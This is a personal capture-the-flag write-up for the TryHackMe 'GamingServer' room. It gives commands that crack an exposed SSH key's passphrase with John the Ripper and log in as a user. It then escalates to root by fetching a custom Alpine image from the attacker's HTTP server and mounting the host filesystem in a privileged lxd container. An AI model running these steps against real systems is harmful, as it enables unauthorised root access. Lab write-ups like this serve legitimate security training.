#lxc #lxd

https://tryhackme.com/r/room/gamingserver

---
#### Nmap
![[Screenshot_2024-05-30_12-16-07.png]]
#### Enumeration
![[Screenshot_2024-05-30_12-21-51.png]]

Firstly, I downloaded 3 files from `/uploads`
- `dict.lst`  seems to be a wordlist
- `manifesto.txt` is a long text with, probably, useful information in it
- `meme.jpg` hiding something, maybe

On `/secret`, there is a private rsa key
```shell
ssh2john id_rsa > hash
johh hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The cracked password is `letmein`, now I need the username

There is a page `/about.php` with a file upload but it is in comment, maybe [this](https://github.com/sAjibuu/Upload_Bypass) will help me

I ll be back, soon of a bitch

I am back and the past me was probably drunk: `john:letmein`
```shell
ssh john@10.10.93.198 -i id_rsa
```

And here I m in

The user `john` is in the `lxd` group, so I'll use the alpine cve well explained [here](https://www.hackingarticles.in/lxd-privilege-escalation/)
On my pc, I start to clone the alpine repo and build it as sudo
```shell
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```
Then I serve the `tar.gz` output
```shell
python3 -m http.server 5050
```
I download the archive and import it as image
```shell
wget http://10.14.79.56:5050/alpine-v3.20-x86_64-20240614_1747.tar.gz

lxc image import ./alpine-v3.20-x86_64-20240614_1747.tar.gz --alias myimage
```

Finally I setup the privilege escalation throught the image
```shell
lxc init myimage ignite -c security.privileged=true 

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true 

lxc start ignite 

lxc exec ignite /bin/sh
```

Then I should go in the mounted root directory
```shell
cd /mnt/root/root
```

And here I m in `/root` as `root`

